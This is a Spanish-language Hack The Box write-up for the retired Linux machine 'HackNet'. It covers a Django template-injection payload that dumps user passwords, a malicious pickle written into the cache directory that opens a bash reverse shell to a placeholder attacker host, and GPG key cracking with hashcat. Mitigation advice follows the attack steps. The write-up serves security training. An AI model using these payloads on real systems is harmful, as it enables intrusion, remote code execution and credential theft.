---
machine: HackNet
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, django, ssti, pickle, gpg, privesc]
---

# HackNet — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La red social Django refleja el nombre de usuario y la página de likes lo interpreta como plantilla: un HTML injection lleva a SSTI y `{{ users.values }}` vuelca usuarios y contraseñas. El email de `mikey` revela su usuario Linux y se entra por SSH. El cache `FileBasedCache` de Django usa pickle en un directorio escribible; un pickle malicioso da shell como `sandy`. La clave GPG se crackea, los backups descifrados contienen la contraseña de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` nginx con una aplicación Django.
- La web permite registro, perfiles, posts y likes.
- `feroxbuster` encuentra `/likes/`, `/profile/` y `/admin/`.

## Enumeración

- El nombre de usuario se refleja sin escapar en la página de likes.
- Un `<>` se filtra, pero una entidad HTML permite inyectar una expresión de plantilla.
- Django evalúa el nombre como plantilla en el contexto de la vista.

```text
username = &#123;&#123; users.values &#125;&#125;
```

## Foothold

Con la SSTI se listan todos los usuarios y sus contraseñas en claro. El email de `mikey` termina en `@hacknet.htb`, lo que revela su usuario del sistema; su contraseña funciona por SSH.

```bash
ssh mikey@hacknet.htb
```

## Movimiento lateral

`mikey` puede escribir en el directorio de cache de Django. `FileBasedCache` serializa los valores con pickle, así que se reemplaza un archivo de cache por un payload que ejecuta una reverse shell al deserializarse. La shell corre como `sandy`.

```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"',))
open('/var/tmp/django_cache/<KEY>', 'wb').write(pickle.dumps(Exploit()))
```

## Escalada de privilegios

En el home de `sandy` hay una clave GPG cifrada y backups de la base. La contraseña de la clave se crackea con Hashcat; al descifrar los backups aparece una conversación con la contraseña de root de MySQL, que se reutiliza para `su`.

```bash
gpg2john sandy.asc > gpg.hash
hashcat -m 17010 gpg.hash rockyou.txt
gpg --decrypt backup.sql.gpg
```

## Evidencia

- HTML injection y SSTI en el nombre de usuario.
- Volcado de usuarios y contraseñas.
- SSH como `mikey`.
- Pickle en `FileBasedCache` y shell como `sandy`.
- Clave GPG crackeada y contraseña de root en el backup.

## Lecciones aprendidas

- Un nombre de usuario reflejado puede acabar en el motor de plantillas.
- Las entidades HTML pueden saltar filtros que solo bloquean `<` y `>`.
- El cache de Django con pickle es código ejecutable si el directorio es escribible.
- Los backups cifrados siguen siendo útiles si la clave es débil.

## Mitigación y detección

- Escapar siempre el nombre y no renderizarlo como plantilla.
- Usar un backend de cache sin pickle y permisos de solo escritura para el servicio.
- Proteger las claves GPG con contraseñas fuertes y separar los backups.
- No reutilizar contraseñas de base de datos para cuentas del sistema.

## Referencias

- [0xdf — HackNet](https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html)
- [IppSec — HackNet](https://www.youtube.com/watch?v=QbAfkivQnW0)
- [Hack The Box — HackNet](https://app.hackthebox.com/machines/hacknet)
